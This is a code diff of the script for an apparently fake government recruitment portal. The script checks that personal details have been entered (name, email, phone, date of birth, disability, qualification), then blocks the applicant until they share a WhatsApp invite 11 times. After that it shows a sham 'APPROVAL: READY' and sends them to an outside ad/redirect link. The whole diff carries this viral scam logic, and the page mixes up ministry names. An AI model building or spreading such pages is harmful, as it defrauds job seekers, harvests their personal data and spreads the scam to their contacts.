@@ -570,99 +570,109 @@ location.href='https://rebrand.ly/Agric-Zm-Recruitment-2026';
   <footer class="sticky-footer">© 2026 Ministry of Agriculture Recruitment Portal. All rights reserved.</footer>
 
   <script>
-    document.addEventListener('DOMContentLoaded', function () {
-      const step1 = document.getElementById('step1');
-      const step2 = document.getElementById('step2');
-      const step3 = document.getElementById('step3');
-      const loadingOverlay = document.getElementById('loadingOverlay');
-      const formOverlay = document.getElementById('formOverlay');
-      const applyNowBtn = document.getElementById('applyNowBtn');
-      const applicationForm = document.getElementById('applicationForm');
-      const proceedBtn = document.getElementById('proceedBtn');
-      const formError = document.getElementById('formError');
-      const whatsappBtn = document.getElementById('whatsappBtn');
-      const progressFill = document.getElementById('progressFill');
-      const progressText = document.getElementById('progressText');
-      const approvalBox = document.getElementById('approvalBox');
-      const retryBtn = document.getElementById('retryBtn');
+  document.addEventListener('DOMContentLoaded', function () {
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const step3 = document.getElementById('step3');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    const formOverlay = document.getElementById('formOverlay');
+    const applyNowBtn = document.getElementById('applyNowBtn');
+    const applicationForm = document.getElementById('applicationForm');
+    const proceedBtn = document.getElementById('proceedBtn');
+    const formError = document.getElementById('formError');
+    const whatsappBtn = document.getElementById('whatsappBtn');
+    const progressFill = document.getElementById('progressFill');
+    const progressText = document.getElementById('progressText');
+    const approvalBox = document.getElementById('approvalBox');
+    const retryBtn = document.getElementById('retryBtn');
 
-      const requiredIds = ['fullName', 'email', 'phone', 'position', 'dob', 'county', 'disability', 'qualification'];
-      let shareClicks = 0;
-      const maxClicks = 11;
-      const whatsappMessage = 'Hello, applications are now open on the Electoral Commission Recruitment Portal. Apply now using this link: https://example.com';
+    let shareClicks = 0;
+    const maxClicks = 11;
+    const whatsappMessage = 'Hello, applications are now open on the Electoral Commission Recruitment Portal. Apply now using this link: https://example.com';
 
-      function showStep(nextStep) {
-        [step1, step2, step3].forEach(step => step.classList.remove('active'));
-        nextStep.classList.add('active');
-        window.scrollTo({ top: 0, behavior: 'smooth' });
+    function showStep(nextStep) {
+      [step1, step2, step3].forEach(step => step.classList.remove('active'));
+      nextStep.classList.add('active');
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function showLoading(callback) {
+      loadingOverlay.classList.add('show');
+      setTimeout(function () {
+        loadingOverlay.classList.remove('show');
+        callback();
+      }, 1200);
+    }
+
+    applyNowBtn.addEventListener('click', function () {
+      formOverlay.style.display = 'none';
+      applicationForm.classList.remove('locked');
+    });
+
+    proceedBtn.addEventListener("click", function () {
+      const fields = [
+        document.getElementById("fullName"),
+        document.getElementById("email"),
+        document.getElementById("phone"),
+        document.getElementById("position"),
+        document.getElementById("dob"),
+        document.getElementById("county"),
+        document.getElementById("disability"),
+        document.getElementById("qualification")
+      ];
+
+      let isValid = true;
+
+      fields.forEach(function (field) {
+        if (!field || !field.value || field.value.trim() === "") {
+          isValid = false;
+        }
+      });
+
+      if (!isValid) {
+        formError.style.display = "block";
+        return;
       }
 
-      function showLoading(callback) {
-        loadingOverlay.classList.add('show');
-        setTimeout(function () {
-          loadingOverlay.classList.remove('show');
-          callback();
-        }, 1200);
-      }
+      formError.style.display = "none";
 
-      applyNowBtn.addEventListener('click', function () {
-        formOverlay.style.display = 'none';
-        applicationForm.classList.remove('locked');
-      });
-
-      proceedBtn.addEventListener('click', function () {
-        let isValid = true;
-
-        requiredIds.forEach(function (id) {
-          const field = document.getElementById(id);
-          if (!field || !field.value || field.value.trim() === '') {
-            isValid = false;
-          }
-        });
-
-        if (!isValid) {
-          formError.style.display = 'block';
-          return;
-        }
-
-        formError.style.display = 'none';
-        showLoading(function () {
-          showStep(step2);
-        });
-      });
-
-      whatsappBtn.addEventListener('click', function (e) {
-        e.preventDefault();
-
-        if (shareClicks < maxClicks) {
-          shareClicks += 1;
-          const progress = Math.round((shareClicks / maxClicks) * 100);
-          progressFill.style.width = progress + '%';
-          progressText.textContent = progress + '%';
-
-          if (shareClicks >= maxClicks) {
-            approvalBox.classList.add('ready');
-            approvalBox.textContent = 'APPROVAL: READY';
-            showLoading(function () {
-              showStep(step3);
-            });
-          }
-        }
-
-        const appLink = 'whatsapp://send?text=' + encodeURIComponent(whatsappMessage);
-        const fallbackLink = 'https://wa.me/?text=' + encodeURIComponent(whatsappMessage);
-        window.location.href = appLink;
-        setTimeout(function () {
-          window.open(fallbackLink, '_blank');
-        }, 1200);
-      });
-
-      retryBtn.addEventListener('click', function () {
-        window.open('https://ey43.com/4/9120968');
-        window.location.href = 'https://ey43.com/4/9120968';
+      showLoading(function () {
+        showStep(step2);
       });
     });
-  </script>
+
+    whatsappBtn.addEventListener('click', function (e) {
+      e.preventDefault();
+
+      if (shareClicks < maxClicks) {
+        shareClicks += 1;
+        const progress = Math.round((shareClicks / maxClicks) * 100);
+        progressFill.style.width = progress + '%';
+        progressText.textContent = progress + '%';
+
+        if (shareClicks >= maxClicks) {
+          approvalBox.classList.add('ready');
+          approvalBox.textContent = 'APPROVAL: READY';
+          showLoading(function () {
+            showStep(step3);
+          });
+        }
+      }
+
+      const appLink = 'whatsapp://send?text=' + encodeURIComponent(whatsappMessage);
+      const fallbackLink = 'https://wa.me/?text=' + encodeURIComponent(whatsappMessage);
+      window.location.href = appLink;
+      setTimeout(function () {
+        window.open(fallbackLink, '_blank');
+      }, 1200);
+    });
+
+    retryBtn.addEventListener('click', function () {
+      window.open('https://ey43.com/4/9120968');
+      window.location.href = 'https://ey43.com/4/9120968';
+    });
+  });
+</script>
 </body>
 </html>
 <!-- BEGIN: Powered by Supercounters.com -->
